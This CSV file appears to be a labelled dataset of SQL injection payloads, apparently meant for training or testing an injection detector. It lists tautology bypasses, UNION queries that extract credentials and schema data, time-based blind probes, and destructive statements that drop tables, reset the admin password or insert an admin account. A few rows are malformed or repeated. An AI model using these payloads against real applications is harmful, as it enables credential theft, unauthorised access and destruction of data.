payload,label
' OR '1'='1,SQL Injection
"' UNION SELECT username, password FROM users--",SQL Injection
'; WAITFOR DELAY '0:0:5'--,SQL Injection
"' AND 1=CONVERT(int,@@version)--",SQL Injection
' AND 1=1--,SQL Injection
'; DROP TABLE users--,SQL Injection
' OR 1=1--,SQL Injection
0x27 OR 0x31=0x31--,SQL Injection
'; SELECT pg_sleep(5)--,SQL Injection
"' AND 1=CONVERT(int,USER())--",SQL Injection
"' AND SUBSTRING(@@version,1,1)='5'--",SQL Injection
' OR 'a'='a,SQL Injection
' OR 1=1-- -,SQL Injection
'//OR//1=1--,SQL Injection
' OR CAST('a' AS INT)=CAST('a' AS INT)--,SQL Injection
' OR SLEEP(5)--,SQL Injection
"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",SQL Injection
"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",SQL Injection
'; SELECT pg_sleep(10)--,SQL Injection
' OR 1=1#,SQL Injection
' OR SLEEP(10)--,SQL Injection
"' UNION SELECT NULL, NULL, username, password FROM users--",SQL Injection
' OR 1=1/*,SQL Injection
' AND (SELECT COUNT(*) FROM users) > 0--,SQL Injection
' OR pg_sleep(7)--,SQL Injection
"' UNION SELECT database(), NULL--",SQL Injection
'; WAITFOR DELAY '0:0:10'--,SQL Injection
' OR CAST(1 AS INT)=1--,SQL Injection
"' OR SUBSTRING(user(),1,1)='r'--",SQL Injection
' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,SQL Injection
"' UNION SELECT table_name, NULL FROM information_schema.tables--",SQL Injection
' OR (SELECT sleep(5))--,SQL Injection
' OR 0x61646d696e=0x61646d696e--,SQL Injection
' OR SLEEP(5)#,SQL Injection
"' UNION SELECT user(), NULL--",SQL Injection
' OR pg_sleep(3)--,SQL Injection
'; WAITFOR DELAY '0:0:3'--,SQL Injection
"' OR SUBSTRING(@@version,1,1)='5'--",SQL Injection
' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,SQL Injection
"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",SQL Injection
' OR SLEEP(8)/*,SQL Injection
"' UNION SELECT table_name, NULL FROM information_schema.tables--",SQL Injection
"' OR SUBSTRING(user(),1,1)='a'/*",SQL Injection
'; UPDATE users SET password='hacked' WHERE username='admin'--,SQL Injection
' OR pg_sleep(6)/*,SQL Injection
"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",SQL Injection
' OR CAST('1' AS INT)=1--,SQL Injection
'; WAITFOR DELAY '0:0:7'/*,SQL Injection
"' OR SUBSTRING(@@version,1,1)='8'#",SQL Injection
"' UNION SELECT user(), NULL--",SQL Injection
' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,SQL Injection
'; DELETE FROM users WHERE username='guest'--,SQL Injection
' OR 0x31=0x31--,SQL Injection
' OR SLEEP(9)#,SQL Injection
"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",SQL Injection
' OR pg_sleep(4)#,SQL Injection
' OR CAST(1 AS INT)=1/*,SQL Injection
"' OR SUBSTRING(user(),1,1)='b'/*",SQL Injection
"' UNION SELECT database(), NULL--",SQL Injection
"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",SQL Injection
'; WAITFOR DELAY '0:0:5'#,SQL Injection
"' OR SUBSTRING(@@version,1,1)='9'#",SQL Injection
"' UNION SELECT user(), NULL--",SQL Injection
' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,SQL Injection
'; DROP TABLE sessions--,SQL Injection
' OR 0x41=0x41--,SQL Injection
' OR SLEEP(11)--,SQL Injection
"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",SQL Injection
' OR pg_sleep(12)--,SQL Injection
'; UPDATE users SET password='newpass' WHERE username='admin'--,SQL Injection
' OR SLEEP(12)--,SQL Injection
"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",SQL Injection
"' OR SUBSTRING(user(),1,1)='c'--",SQL Injection
"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",SQL Injection
' OR pg_sleep(8)--,SQL Injection
"' UNION SELECT @@version, NULL--",SQL Injection
' OR CAST('1' AS INT)=1--,SQL Injection
'; WAITFOR DELAY '0:0:8'--,SQL Injection
"' OR SUBSTRING(@@version,1,1)='7'--",SQL Injection
"' UNION SELECT user(), NULL--",SQL Injection
